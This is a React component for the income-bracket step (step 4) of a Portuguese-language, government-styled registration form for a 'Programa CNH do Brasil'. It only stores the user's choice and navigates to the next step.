import { useMemo, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "./StepIncome.css";

export default function StepIncome() {
  const location = useLocation();
  const navigate = useNavigate();
  const data = location.state;

  const [selected, setSelected] = useState("");

  const options = useMemo(
    () => [
      "Desempregado(a)",
      "Até R$ 2.640 (até 2 Salários Mínimos)",
      "De R$ 2.641 a R$ 6.600 (2 a 5 Salários Mínimos)",
      "De R$ 6.601 a R$ 13.200 (5 a 10 Salários Mínimos)",
      "Acima de R$ 13.200 (mais de 10 Salários Mínimos)",
    ],
    []
  );

  if (!data) return <div className="step-loading">Carregando...</div>;

  const onConfirm = () => {
    if (!selected) return;

    navigate("/stepcnh", {
      state: {
        ...data,
        rendaSelecionada: selected,
      },
    });
  };

  return (
    <div className="gov-page">
      <header className="gov-header">
        <div className="gov-header-inner">
          <div className="gov-brand">
            <img className="gov-logo" src="/logo.png" alt="Logo" />
            <div className="gov-brand-title">Programa CNH do Brasil</div>
          </div>
        </div>
      </header>

      <main className="gov-main">
        <section className="gov-card">
          <h2 className="gov-card-title">
            Confirme seus dados para o cadastro no Programa CNH do Brasil
          </h2>

          <div className="gov-step">
            <div className="step-circle">4</div>
            <div className="step-title">Qual é sua faixa salarial atual?</div>
          </div>

          <div className="option-list">
            {options.map((opt) => {
              const active = selected === opt;
              return (
                <button
                  key={opt}
                  type="button"
                  className={`option-item ${active ? "active" : ""}`}
                  onClick={() => setSelected(opt)}
                >
                  {opt}
                </button>
              );
            })}
          </div>

          <button
            type="button"
            className="confirm-btn"
            disabled={!selected}
            onClick={onConfirm}
          >
            Confirmar
          </button>
        </section>
      </main>
    </div>
  );
}